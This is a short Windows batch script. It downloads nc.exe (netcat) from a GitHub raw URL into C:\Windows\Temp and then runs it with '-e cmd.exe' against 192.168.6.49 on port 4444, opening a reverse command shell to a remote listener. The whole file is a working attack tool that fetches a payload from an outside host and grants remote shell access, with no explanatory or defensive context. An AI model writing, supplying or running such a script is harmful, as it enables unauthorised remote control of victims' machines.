@echo off
REM Download nc.exe from GitHub
curl -s https://raw.githubusercontent.com/bhartendragit/code/main/nc.exe -o C:\Windows\Temp\nc.exe

REM Check if nc.exe was downloaded successfully
if exist C:\Windows\Temp\nc.exe (
    echo nc.exe downloaded successfully.
) else (
    echo Failed to download nc.exe.
    exit /b
)

REM Execute netcat for reverse shell
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.6.49 4444
